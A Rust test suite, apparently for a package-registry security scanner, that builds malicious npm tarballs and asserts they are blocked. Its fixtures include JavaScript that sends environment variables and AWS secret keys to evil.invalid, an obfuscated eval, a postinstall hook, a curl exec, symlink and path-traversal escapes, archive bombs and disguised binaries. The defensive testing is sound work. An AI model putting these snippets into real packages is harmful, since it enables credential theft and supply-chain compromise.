//! ADR-018 Increment 2 Adversarial Red-Team & Concurrency Verification Suite.
//!
//! Validates protection against `VNA-09` (non-UTF-8 silent scanner bypass),
//! `VNA-10` (ecosystem spoofing & hidden lifecycle hooks), `VNA-11` (tar/gzip
//! bombs, traversal, symlinks, disguised ELF/WASM), and `VNA-12` (lock-free
//! concurrent `yara-x` raw-byte scanning).

use common::{FindingSeverity, PackageId, PackageManifest};
use flate2::write::GzEncoder;
use flate2::Compression;
use std::io::Write;
use std::path::PathBuf;
use std::sync::Once;
use std::time::Instant;
use tar::{Builder, EntryType, Header};
use validator::bundle::AnalysisBundleSet;
use validator::reputation::ReputationAssessment;
use validator::risk::{RiskAggregator, RiskDisposition};
use validator::static_analysis;

fn ensure_rules_dir() {
    static INIT: Once = Once::new();
    INIT.call_once(|| {
        let rules_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../rules");
        let resolved = std::fs::canonicalize(&rules_dir).unwrap_or(rules_dir);
        std::env::set_var("CREG_YARA_RULES_DIR", resolved);
    });
}

fn make_tgz(entries: &[(&str, EntryType, &[u8], Option<&str>)]) -> Vec<u8> {
    let mut out = Vec::new();
    {
        let gz = GzEncoder::new(&mut out, Compression::default());
        let mut tar = Builder::new(gz);
        for (path, kind, data, link_target) in entries {
            let mut header = Header::new_gnu();
            header.set_entry_type(*kind);
            header.set_mode(0o644);
            header.set_size(if *kind == EntryType::Regular {
                data.len() as u64
            } else {
                0
            });
            if let Some(target) = link_target {
                header.set_link_name(target).expect("set link target");
            }
            header.set_cksum();
            let payload: &[u8] = if *kind == EntryType::Regular {
                data
            } else {
                &[]
            };
            tar.append_data(&mut header, path, payload).unwrap();
        }
        let gz = tar.into_inner().unwrap();
        gz.finish().unwrap();
    }
    out
}

fn make_raw_path_tgz(raw_path: &str, data: &[u8]) -> Vec<u8> {
    let mut tar_bytes = Vec::new();
    {
        let mut header = Header::new_gnu();
        header.set_entry_type(EntryType::Regular);
        header.set_mode(0o644);
        header.set_size(data.len() as u64);
        let name_bytes = raw_path.as_bytes();
        let raw_hdr = header.as_mut_bytes();
        let copy_len = name_bytes.len().min(100);
        raw_hdr[..copy_len].copy_from_slice(&name_bytes[..copy_len]);
        header.set_cksum();
        tar_bytes.extend_from_slice(header.as_bytes());
        tar_bytes.extend_from_slice(data);
        let rem = data.len() % 512;
        if rem != 0 {
            tar_bytes.resize(tar_bytes.len() + (512 - rem), 0);
        }
        tar_bytes.resize(tar_bytes.len() + 1024, 0);
    }
    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    gz.write_all(&tar_bytes).unwrap();
    gz.finish().unwrap()
}

fn minimal_elf64_rwx() -> Vec<u8> {
    let mut buf = vec![0u8; 64 + 56];
    buf[0..16].copy_from_slice(&[0x7f, b'E', b'L', b'F', 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
    buf[16..18].copy_from_slice(&2u16.to_le_bytes()); // ET_EXEC
    buf[18..20].copy_from_slice(&62u16.to_le_bytes()); // EM_X86_64
    buf[20..24].copy_from_slice(&1u32.to_le_bytes());
    buf[32..40].copy_from_slice(&64u64.to_le_bytes()); // e_phoff
    buf[52..54].copy_from_slice(&64u16.to_le_bytes());
    buf[54..56].copy_from_slice(&56u16.to_le_bytes());
    buf[56..58].copy_from_slice(&1u16.to_le_bytes());
    buf[64..68].copy_from_slice(&1u32.to_le_bytes()); // PT_LOAD
    buf[68..72].copy_from_slice(&7u32.to_le_bytes()); // PF_R | PF_W | PF_X
    buf[96..104].copy_from_slice(&64u64.to_le_bytes());
    buf[104..112].copy_from_slice(&64u64.to_le_bytes());
    buf
}

fn minimal_wasm_sock_accept() -> Vec<u8> {
    let mut wasm = vec![0x00, b'a', b's', b'm', 0x01, 0x00, 0x00, 0x00];
    wasm.extend_from_slice(&[0x01, 0x04, 0x01, 0x60, 0x00, 0x00]);
    let mut imp_body = vec![0x01];
    imp_body.push(22);
    imp_body.extend_from_slice(b"wasi_snapshot_preview1");
    imp_body.push(11);
    imp_body.extend_from_slice(b"sock_accept");
    imp_body.push(0x00);
    imp_body.push(0x00);
    wasm.push(0x02);
    wasm.push(imp_body.len() as u8);
    wasm.extend_from_slice(&imp_body);
    wasm
}

fn summarize_risk(
    pkg_id: &PackageId,
    res: &static_analysis::StaticAnalysisResult,
) -> validator::risk::RiskSummary {
    let rep = ReputationAssessment {
        confidence_delta: 0,
        publisher_pubkey: "aa".repeat(32),
        notes: Vec::new(),
        revoked_pgp_fps: Vec::new(),
    };
    RiskAggregator::default().summarize(
        pkg_id,
        &res.findings,
        res.deterministic_score,
        res.advisory_score,
        res.ensemble_score,
        None,
        &AnalysisBundleSet::default(),
        &rep,
    )
}

#[tokio::test]
async fn adv_utf8_0xff_js() {
    ensure_rules_dir();
    let pkg_id = PackageId::new("npm", "evil-utf8-pkg", "1.0.0");
    let mut evil_js = b"// \xff\xfe invalid utf8 bypass attempt\n".to_vec();
    evil_js.extend_from_slice(
        b"const creds = process.env; fetch('https://evil.invalid', {body: JSON.stringify(creds)}); eval(creds.CMD);\n",
    );
    let tgz = make_tgz(&[
        (
            "package/package.json",
            EntryType::Regular,
            br#"{"name":"evil-utf8-pkg","version":"1.0.0"}"#,
            None,
        ),
        ("package/index.js", EntryType::Regular, &evil_js, None),
    ]);

    let res = static_analysis::run_for_package(Some(&pkg_id), &tgz, &PackageManifest::default())
        .await
        .expect("static analysis");
    let nonutf8 = res
        .findings
        .iter()
        .find(|f| f.id == "ST-NONUTF8-IN-SOURCE")
        .expect("must emit ST-NONUTF8-IN-SOURCE");
    assert_eq!(nonutf8.severity, FindingSeverity::Critical);
    assert!(res.findings.iter().any(|f| f.id == "SA001"));
    assert!(res.findings.iter().any(|f| f.id == "DS003"));

    let summary = summarize_risk(&pkg_id, &res);
    assert!(summary.deterministic_block);
    assert_eq!(summary.disposition, RiskDisposition::Block);
}

#[tokio::test]
async fn adv_zipbomb_1gb() {
    ensure_rules_dir();
    // 1. Single-file sparse 128 MiB bomb compressed tightly
    let zeros = vec![0u8; 128 * 1024 * 1024];
    let sparse_bomb = make_tgz(&[("package/sparse.bin", EntryType::Regular, &zeros, None)]);

    let start = Instant::now();
    let err = creg_unpack::unpack_tarball(&sparse_bomb).expect_err("must reject 128 MiB bomb");
    assert!(
        start.elapsed().as_millis() < 2_000,
        "bomb abort took {:?}",
        start.elapsed()
    );
    assert_eq!(err.violation_code(), "ST-ARCHIVE-BOMB");

    // 2. Multi-file >20:1 ratio bomb (~15 MiB incompressible via normal tar < 4 MiB per file, compressed to < 50 KiB)
    let chunk = vec![b'A'; 3 * 1024 * 1024];
    let ratio_bomb = make_tgz(&[
        ("package/f1.txt", EntryType::Regular, &chunk, None),
        ("package/f2.txt", EntryType::Regular, &chunk, None),
        ("package/f3.txt", EntryType::Regular, &chunk, None),
        ("package/f4.txt", EntryType::Regular, &chunk, None),
        ("package/f5.txt", EntryType::Regular, &chunk, None),
    ]);

    let pkg_id = PackageId::new("npm", "ratio-bomb", "1.0.0");
    let res =
        static_analysis::run_for_package(Some(&pkg_id), &ratio_bomb, &PackageManifest::default())
            .await
            .expect("bomb fails closed cleanly in static_analysis");
    assert!(res
        .findings
        .iter()
        .any(|f| f.id == "ST-ARCHIVE-BOMB" && f.severity == FindingSeverity::Critical));
    assert_eq!(res.ml_model_version, "degraded-extraction");
    assert_eq!(res.deterministic_score, 100.0);
}

#[tokio::test]
async fn adv_symlink_escape() {
    ensure_rules_dir();
    let pkg_id = PackageId::new("npm", "escape-pkg", "1.0.0");
    let manifest = PackageManifest::default();

    let sym = make_tgz(&[(
        "package/escape",
        EntryType::Symlink,
        b"",
        Some("../../root/.ssh/authorized_keys"),
    )]);
    let res_sym = static_analysis::run_for_package(Some(&pkg_id), &sym, &manifest)
        .await
        .unwrap();
    assert!(res_sym
        .findings
        .iter()
        .any(|f| f.id == "ST-ARCHIVE-LINK" && f.severity == FindingSeverity::Critical));

    let hard = make_tgz(&[(
        "package/hard",
        EntryType::Link,
        b"",
        Some("package/index.js"),
    )]);
    let res_hard = static_analysis::run_for_package(Some(&pkg_id), &hard, &manifest)
        .await
        .unwrap();
    assert!(res_hard.findings.iter().any(|f| f.id == "ST-ARCHIVE-LINK"));

    let trav = make_raw_path_tgz("../escape.js", b"eval('1');");
    let res_trav = static_analysis::run_for_package(Some(&pkg_id), &trav, &manifest)
        .await
        .unwrap();
    assert!(res_trav
        .findings
        .iter()
        .any(|f| f.id == "ST-ARCHIVE-TRAVERSAL"));

    let dup = make_tgz(&[
        ("./package/index.js", EntryType::Regular, b"clean();", None),
        (
            "package/index.js",
            EntryType::Regular,
            b"eval('evil');",
            None,
        ),
    ]);
    let res_dup = static_analysis::run_for_package(Some(&pkg_id), &dup, &manifest)
        .await
        .unwrap();
    assert!(res_dup
        .findings
        .iter()
        .any(|f| f.id == "ST-ARCHIVE-DUPLICATE"));
}

#[tokio::test]
async fn adv_ecosystem_spoof() {
    ensure_rules_dir();
    let pkg_id = PackageId::new("npm", "spoof-victim", "1.0.0");
    // Maliciously ordered Cargo.toml before package.json + JS payload
    let tgz = make_tgz(&[
        (
            "a/Cargo.toml",
            EntryType::Regular,
            b"[package]\nname = \"decoy\"\nversion = \"0.1.0\"\n",
            None,
        ),
        (
            "package/package.json",
            EntryType::Regular,
            br#"{"name":"spoof-victim","version":"1.0.0"}"#,
            None,
        ),
        (
            "package/index.js",
            EntryType::Regular,
            b"const e = process.env; fetch('https://evil.invalid', {body: JSON.stringify(e)}); eval(e.A);\n",
            None,
        ),
    ]);

    let res = static_analysis::run_for_package(Some(&pkg_id), &tgz, &PackageManifest::default())
        .await
        .expect("static analysis");
    assert!(res
        .findings
        .iter()
        .any(|f| f.id == "ST-ECOSYSTEM-SPOOF" && f.severity == FindingSeverity::High));
    assert!(
        res.findings.iter().any(|f| f.id == "SA001"),
        "npm SA001 rules must still run despite leading Cargo.toml"
    );
    assert!(
        res.findings.iter().any(|f| f.id == "DS003"),
        "npm YARA scan must still block despite leading Cargo.toml"
    );
    let summary = summarize_risk(&pkg_id, &res);
    assert_eq!(summary.disposition, RiskDisposition::Block);
}

#[tokio::test]
async fn adv_disguised_elf_and_rwx_binary() {
    ensure_rules_dir();
    let pkg_id = PackageId::new("npm", "elf-png", "1.0.0");
    let elf = minimal_elf64_rwx();
    let tgz = make_tgz(&[
        (
            "package/package.json",
            EntryType::Regular,
            br#"{"name":"elf-png","version":"1.0.0"}"#,
            None,
        ),
        ("package/assets/logo.png", EntryType::Regular, &elf, None),
    ]);

    let res = static_analysis::run_for_package(Some(&pkg_id), &tgz, &PackageManifest::default())
        .await
        .expect("static analysis");
    assert!(res
        .findings
        .iter()
        .any(|f| f.id == "ST-BIN-DISGUISED" && f.severity == FindingSeverity::Critical));
    assert!(res
        .findings
        .iter()
        .any(|f| f.id == "ST-BIN-RWX" && f.severity == FindingSeverity::Critical));
    let bin = res.binary_report.as_ref().expect("binary report");
    assert_eq!(bin.binaries.len(), 1);
    assert!(bin.binaries[0].is_disguised_extension);
    assert!(bin.binaries[0].has_rwx_segment);

    let summary = summarize_risk(&pkg_id, &res);
    assert_eq!(summary.disposition, RiskDisposition::Block);
}

#[tokio::test]
async fn adv_disguised_wasm_sensitive_import() {
    ensure_rules_dir();
    let pkg_id = PackageId::new("npm", "wasm-png", "1.0.0");
    let wasm = minimal_wasm_sock_accept();
    let tgz = make_tgz(&[
        (
            "package/package.json",
            EntryType::Regular,
            br#"{"name":"wasm-png","version":"1.0.0"}"#,
            None,
        ),
        ("package/icon.png", EntryType::Regular, &wasm, None),
    ]);

    let res = static_analysis::run_for_package(Some(&pkg_id), &tgz, &PackageManifest::default())
        .await
        .expect("static analysis");
    assert!(res
        .findings
        .iter()
        .any(|f| f.id == "ST-BIN-DISGUISED" && f.severity == FindingSeverity::Critical));
    assert!(res
        .findings
        .iter()
        .any(|f| f.id == "ST-BIN-WASM-SENSITIVE-IMPORT" && f.severity == FindingSeverity::High));
    let summary = summarize_risk(&pkg_id, &res);
    assert_eq!(summary.disposition, RiskDisposition::Block);
}

#[tokio::test]
async fn adv_ast_computed_bracket_and_postinstall_hook() {
    ensure_rules_dir();
    let pkg_id = PackageId::new("npm", "ast-hook-obf", "1.0.0");
    let init_js = br#"
        const k = process.env.AWS_SECRET_ACCESS_KEY;
        global[atob("ZXZhbA==")](k);
        fetch("https://evil.invalid", { method: "POST", body: k });
    "#;
    let tgz = make_tgz(&[
        (
            "package/package.json",
            EntryType::Regular,
            br#"{"name":"ast-hook-obf","version":"1.0.0","scripts":{"postinstall":"node scripts/init.js"}}"#,
            None,
        ),
        (
            "package/scripts/init.js",
            EntryType::Regular,
            init_js,
            None,
        ),
    ]);

    let res = static_analysis::run_for_package(Some(&pkg_id), &tgz, &PackageManifest::default())
        .await
        .expect("static analysis");
    assert!(res.findings.iter().any(|f| f.id == "ST-MANIFEST-HOOK"));
    assert!(res
        .findings
        .iter()
        .any(|f| f.id == "ST-AST-OBFUSCATED-CALL"));
    assert!(res.findings.iter().any(|f| f.id == "ST-AST-TAINT-EXFIL"));
    assert!(res.findings.iter().any(|f| f.id == "ST-AST-HOOK-SINK"));

    let summary = summarize_risk(&pkg_id, &res);
    assert_eq!(summary.disposition, RiskDisposition::Block);
}

#[test]
fn concurrent_yara_zero_lock_contention() {
    ensure_rules_dir();
    assert!(
        ml_validator::yara_scanner::rules_available(),
        "rules/supply_chain.yar must load cleanly"
    );

    let mut payload = b"// \xff\xfe binary comment header\n".to_vec();
    payload.extend_from_slice(
        b"const env = process.env; fetch('https://evil.invalid', {body: JSON.stringify(env)});",
    );

    let handles: Vec<_> = (0..16)
        .map(|_| {
            let bytes = payload.clone();
            std::thread::spawn(move || {
                for _ in 0..50 {
                    let matches = ml_validator::yara_scanner::scan_raw_files(&[(
                        "package/index.js",
                        bytes.as_slice(),
                    )])
                    .expect("lock-free scan must succeed");
                    assert!(
                        matches
                            .iter()
                            .any(|m| m.rule_name == "ExfilEnvVars" && m.threat_level == 5),
                        "expected ExfilEnvVars match, got {matches:?}"
                    );
                }
            })
        })
        .collect();

    for handle in handles {
        handle.join().expect("scanner worker thread panicked");
    }
}

// ── ADR-018 Increment 4 Adversarial & Kernel Sandbox Tests (VNA-14..VNA-17) ──

fn minimal_valid_wasm_ret0() -> Vec<u8> {
    vec![
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // magic + version
        0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, // type () -> i32
        0x03, 0x02, 0x01, 0x00, // func 0
        0x07, 0x08, 0x01, 0x04, b'm', b'a', b'i', b'n', 0x00, 0x00, // export main
        0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x00, 0x0b, // const 0; end
    ]
}

#[tokio::test]
async fn adv_dummy_wasm_bypass() {
    let npm_pkg = PackageId::new("npm", "stealth-exfil-wasm", "1.0.0");
    let dummy_wasm = minimal_valid_wasm_ret0();
    let mixed_npm_tgz = make_tgz(&[
        (
            "package/package.json",
            EntryType::Regular,
            br#"{"name":"stealth-exfil-wasm","version":"1.0.0","scripts":{"postinstall":"node evil.js"}}"#,
            None,
        ),
        (
            "package/evil.js",
            EntryType::Regular,
            b"require('child_process').exec('curl https://evil.invalid');",
            None,
        ),
        ("package/dummy.wasm", EntryType::Regular, &dummy_wasm, None),
    ]);

    assert!(
        !validator::wasm_sandbox::is_standalone_wasm_package(&npm_pkg, &mixed_npm_tgz),
        "mixed npm package with JS/postinstall + dummy .wasm MUST NOT enter Tier 3 WASM fallback"
    );

    let pure_wasm_pkg = PackageId::new("wasm", "pure-mod", "1.0.0");
    let pure_wasm_tgz = make_tgz(&[
        ("module.wasm", EntryType::Regular, &dummy_wasm, None),
        ("README.md", EntryType::Regular, b"# Pure WASM\n", None),
    ]);
    assert!(
        validator::wasm_sandbox::is_standalone_wasm_package(&pure_wasm_pkg, &pure_wasm_tgz),
        "genuine standalone WASM package must be accepted by Tier 3"
    );

    // If CREG_DEV_SANDBOX is unset on a host without Firecracker/nsjail, mixed npm package fails closed.
    if std::env::var("CREG_DEV_SANDBOX").is_err() {
        let status = validator::sandbox::engine_status().await;
        if !status.isolated {
            assert!(
                validator::sandbox::run(&npm_pkg, &mixed_npm_tgz, &PackageManifest::default())
                    .await
                    .is_err(),
                "mixed npm+dummy.wasm package must fail closed without Tier 1/2 isolation"
            );
        }
    }
}

#[test]
fn adv_sandbox_cache_manifest_invalidation() {
    let tgz = b"fixed-package-bytes";
    let trigger = validator::kernel_sandbox::TriggerSpecV1::default();
    let base_manifest = PackageManifest::default();

    let key0 = validator::sandbox::compute_sandbox_cache_key(
        tgz,
        "npm",
        &base_manifest,
        "policy-v1",
        &trigger,
        120,
        512,
        &validator::sandbox::NetworkMode::ManifestOnly,
    );

    let mut escalated_manifest = base_manifest.clone();
    escalated_manifest.allowed_fs_writes.push("/tmp/out".into());
    escalated_manifest.allowed_process_spawns.push("sh".into());
    let key_manifest = validator::sandbox::compute_sandbox_cache_key(
        tgz,
        "npm",
        &escalated_manifest,
        "policy-v1",
        &trigger,
        120,
        512,
        &validator::sandbox::NetworkMode::ManifestOnly,
    );
    assert_ne!(
        key0, key_manifest,
        "manifest permissions must invalidate cache key"
    );

    let key_policy = validator::sandbox::compute_sandbox_cache_key(
        tgz,
        "npm",
        &base_manifest,
        "policy-v2",
        &trigger,
        120,
        512,
        &validator::sandbox::NetworkMode::ManifestOnly,
    );
    assert_ne!(key0, key_policy, "policy bundle must invalidate cache key");

    let mut alt_trigger = trigger;
    alt_trigger
        .env_overrides
        .insert("NODE_ENV".into(), "production".into());
    let key_trigger = validator::sandbox::compute_sandbox_cache_key(
        tgz,
        "npm",
        &base_manifest,
        "policy-v1",
        &alt_trigger,
        120,
        512,
        &validator::sandbox::NetworkMode::ManifestOnly,
    );
    assert_ne!(key0, key_trigger, "TriggerSpecV1 must invalidate cache key");
}

#[test]
fn adv_rootfs_digest_tamper_fails_closed() {
    let temp = tempfile::tempdir().unwrap();
    let rootfs_base = temp.path();

    // Missing rootfs must fail closed — never fall back to "/"
    let missing_err = validator::kernel_sandbox::resolve_rootfs_strict(rootfs_base, "npm")
        .unwrap_err()
        .to_string();
    assert!(missing_err.contains("KB-ROOTFS-DIGEST-MISMATCH"));

    let npm_bin = rootfs_base.join("npm").join("bin");
    std::fs::create_dir_all(&npm_bin).unwrap();
    let node_bin = npm_bin.join("node");
    std::fs::write(&node_bin, b"legitimate-alpine-node-binary").unwrap();
    validator::kernel_sandbox::write_rootfs_digest_manifest(rootfs_base, &["npm"]).unwrap();

    let verified = validator::kernel_sandbox::resolve_rootfs_strict(rootfs_base, "npm")
        .expect("valid pinned rootfs must verify");
    assert_eq!(verified.file_count, 1);

    // Tamper 1 byte in rootfs binary
    std::fs::write(&node_bin, b"trojanized-alpine-node-binary").unwrap();
    let tamper_err = validator::kernel_sandbox::resolve_rootfs_strict(rootfs_base, "npm")
        .unwrap_err()
        .to_string();
    assert!(
        tamper_err.contains("KB-ROOTFS-DIGEST-MISMATCH"),
        "tampered rootfs must fail with KB-ROOTFS-DIGEST-MISMATCH, got: {tamper_err}"
    );
}

#[test]
fn adv_canary_exfil_all_encodings() {
    use base64::engine::general_purpose::{STANDARD, URL_SAFE_NO_PAD};
    use base64::Engine as _;
    use validator::kernel_sandbox::{
        normalize_telemetry, CanaryChannel, CanaryEncoding, CanaryProfile, ExecutionTier,
        TriggerSpecV1,
    };

    let profile = CanaryProfile::for_run(b"adversarial-canary-seed");
    let token = profile.secrets[2].token.clone(); // npmrc_token

    let raw_hits = profile.scan_payload(CanaryChannel::Stdout, token.as_bytes());
    assert!(raw_hits.iter().any(|h| h.encoding == CanaryEncoding::Raw));

    let b64_payload = STANDARD.encode(token.as_bytes());
    let b64_hits = profile.scan_payload(CanaryChannel::NetworkPayload, b64_payload.as_bytes());
    assert!(b64_hits
        .iter()
        .any(|h| h.encoding == CanaryEncoding::Base64));

    let b64url_payload = URL_SAFE_NO_PAD.encode(token.as_bytes());
    let b64url_hits =
        profile.scan_payload(CanaryChannel::NetworkPayload, b64url_payload.as_bytes());
    assert!(b64url_hits.iter().any(|h| matches!(
        h.encoding,
        CanaryEncoding::Base64Url | CanaryEncoding::Base64
    )));

    let hex_low = hex::encode(token.as_bytes());
    assert!(profile
        .scan_payload(CanaryChannel::NetworkPayload, hex_low.as_bytes())
        .iter()
        .any(|h| h.encoding == CanaryEncoding::HexLower));

    let hex_up = hex::encode_upper(token.as_bytes());
    assert!(profile
        .scan_payload(CanaryChannel::NetworkPayload, hex_up.as_bytes())
        .iter()
        .any(|h| h.encoding == CanaryEncoding::HexUpper));

    let url_enc = token.replace('_', "%5F");
    let url_hits = profile.scan_payload(CanaryChannel::DnsQuery, url_enc.as_bytes());
    assert!(url_hits
        .iter()
        .any(|h| h.encoding == CanaryEncoding::UrlEncoded));

    let graph = normalize_telemetry(
        ExecutionTier::Tier2Nsjail,
        &TriggerSpecV1::default(),
        &PackageManifest::default(),
        &std::collections::HashSet::new(),
        &[],
        &[],
        &[],
        &b64_hits,
    );
    let findings = graph.into_findings();
    assert!(findings
        .iter()
        .any(|f| f.id == "KB-CANARY-EXFIL" && f.severity == FindingSeverity::Critical));

    let rep = ReputationAssessment {
        confidence_delta: 0,
        publisher_pubkey: "aa".repeat(32),
        notes: Vec::new(),
        revoked_pgp_fps: Vec::new(),
    };
    let pkg_id = PackageId::new("npm", "canary-leaker", "1.0.0");
    let summary = RiskAggregator::default().summarize(
        &pkg_id,
        &findings,
        100.0,
        0.0,
        100.0,
        None,
        &AnalysisBundleSet::default(),
        &rep,
    );
    assert_eq!(summary.disposition, RiskDisposition::Block);
}

#[test]
fn adv_kernel_behavior_graph_determinism() {
    use validator::kernel_sandbox::{
        normalize_telemetry, ExecutionTier, RawKernelEvent, TriggerSpecV1,
    };

    let trigger = TriggerSpecV1::default();
    let manifest = PackageManifest {
        allowed_fs_writes: vec!["/tmp/<run>/out".into()],
        spawns_processes: true,
        allowed_process_spawns: vec!["node".into()],
        ..PackageManifest::default()
    };
    let ips = std::collections::HashSet::new();

    let events_run1 = vec![
        RawKernelEvent::OpenWrite {
            path: "/tmp/creg-sandbox-11111111-2222-3333-4444-555555555555/out".into(),
        },
        RawKernelEvent::MemoryRwx {
            kind: "mprotect_rwx".into(),
            detail: "ptr=0x7f1122334455 pid=1001 ts=1700000001".into(),
        },
    ];
    let events_run2 = vec![
        RawKernelEvent::OpenWrite {
            path: "/tmp/creg-sandbox-aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee/out".into(),
        },
        RawKernelEvent::MemoryRwx {
            kind: "mprotect_rwx".into(),
            detail: "ptr=0x7f9988776655 pid=8842 ts=1799999999".into(),
        },
    ];

    let g1 = normalize_telemetry(
        ExecutionTier::Tier1Firecracker,
        &trigger,
        &manifest,
        &ips,
        &events_run1,
        &[],
        &[],
        &[],
    );
    let g2 = normalize_telemetry(
        ExecutionTier::Tier2Nsjail,
        &trigger,
        &manifest,
        &ips,
        &events_run2,
        &[],
        &[],
        &[],
    );

    assert_eq!(
        g1.canonical_digest(),
        g2.canonical_digest(),
        "volatile run UUIDs, ASLR addresses, PIDs, and timestamps must strip identically"
    );
}
